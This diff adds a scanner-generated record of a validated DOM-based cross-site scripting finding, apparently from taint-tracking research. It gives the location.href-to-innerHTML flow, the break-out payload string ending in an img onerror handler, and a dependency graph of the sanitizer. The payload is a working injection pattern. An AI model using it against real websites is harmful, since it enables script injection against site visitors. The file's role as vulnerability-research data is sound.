@@ -1,0 +1,106 @@
+// Finding: 0733b8c1-5fd4-4996-9cc8-039256eb2614
+// Finding.url: https://www.example408.com/wedding-ideas/wedding-color-palette-generator##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('64b48b489dbf43f2ab56b60f82e711d8')><!--/*
+// Finding.parentloc: https://www.example408.com/wedding-ideas/wedding-color-palette-generator##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('64b48b489dbf43f2ab56b60f82e711d8')><!--/*
+// Finding.domain: www.example408.com
+// Finding.base_domain: example408.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 2
+// Sanitizer.name: o.prototype.buildUrl
+// Sanitizer.location: https://example409.com/widget/loader.js - o.prototype.buildUrl:1:10897
+// Finding.begin: 3653
+// Finding.end: 4019
+// Finding.original_uuid: ea86efa0-e092-432a-ad76-83af5e145609
+// Finding.TwentyFiveMillionFlowsId: -435406442
+// Finding.script: https://example409.com/widget/loader.js
+// Finding.line: 1
+// Exploit.uuid: 64b48b48-9dbf-43f2-ab56-b60f82e711d8
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: "
+// Exploit.tag: img
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 73
+// Exploit.replace_begin_url: 73
+// Exploit.replace_end_url: 73
+// Exploit.replace_begin_param: 133
+// Exploit.replace_end_param: 133
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -387202328
+// DepGraph.sanitizer_hash: 1121032838
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="encodeURIComponent"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: state[p_u]="];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: ~/quizzes/477071?"];
+n7 [shape=ellipse, label="atob"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="preg_replace"];
+n10 [shape=box, label="RegExp: /[=]/"];
+n11 [shape=box, label="Lit: "];
+n12 [shape=box, label="Var: x"];
+n13 [shape=ellipse, label="preg_replace"];
+n14 [shape=box, label="RegExp: /\+/"];
+n15 [shape=box, label="Lit: -"];
+n16 [shape=box, label="Var: x"];
+n17 [shape=ellipse, label="preg_replace"];
+n18 [shape=box, label="RegExp: /\//"];
+n19 [shape=box, label="Lit: _"];
+n20 [shape=box, label="Var: x"];
+n21 [shape=ellipse, label="."];
+n22 [shape=box, label="Lit: https://www.qzzr.com/widget/quiz/"];
+n23 [shape=box, label="Var: x"];
+n24 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n5 -> n6;
+n5 -> n3;
+n8 -> n5;
+n7 -> n8;
+n12 -> n7;
+n9 -> n10;
+n9 -> n11;
+n9 -> n12;
+n16 -> n9;
+n13 -> n14;
+n13 -> n15;
+n13 -> n16;
+n20 -> n13;
+n17 -> n18;
+n17 -> n19;
+n17 -> n20;
+n21 -> n22;
+n21 -> n17;
+n23 -> n21;
+n24 -> n23;
+}
